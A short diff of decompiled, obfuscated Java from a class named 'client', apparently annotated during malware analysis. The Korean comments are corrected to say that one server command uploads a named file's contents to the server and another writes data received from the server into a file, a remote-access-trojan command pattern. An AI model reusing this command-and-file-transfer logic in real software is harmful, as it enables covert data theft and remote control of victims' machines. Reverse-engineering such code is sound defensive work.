@@ -124,11 +124,13 @@ public class client {
                                     (new h(var21[1], var21[2])).start();
                                 } else if (var21[0].equals(k.r)) {  // @0005
                                     // var21[1~3]을 인자로 d.a를 call한다.
+                                    // var21[2]와 var21[3]이 포함된 문자열을 서버에 전송한 후
+                                    // var21[1]이라는 파일의 내용을 서버에 전송한다.
                                     (new d(k.b, k.c, var21[1], var21[2], var21[3], "0")).start();
                                 } else if (var21[0].equals(k.s)) {  // @0006
                                     // var21[1~3]을 인자로 d.b를 call한다.
                                     // var21[2]와 var21[3]이 포함된 문자열을 서버에 전송한 후
-                                    // var21[1]이라는 파일의 내용을 서버에 전송한다.
+                                    // 서버로부터 무언가를 받아서 var21[1]이라는 파일에 기록한다.
                                     (new d(k.b, k.c, var21[1], var21[2], var21[3], "1")).start();
                                 } else if (var21[0].equals(k.t)) {  // @0007
                                     (new g()).start();
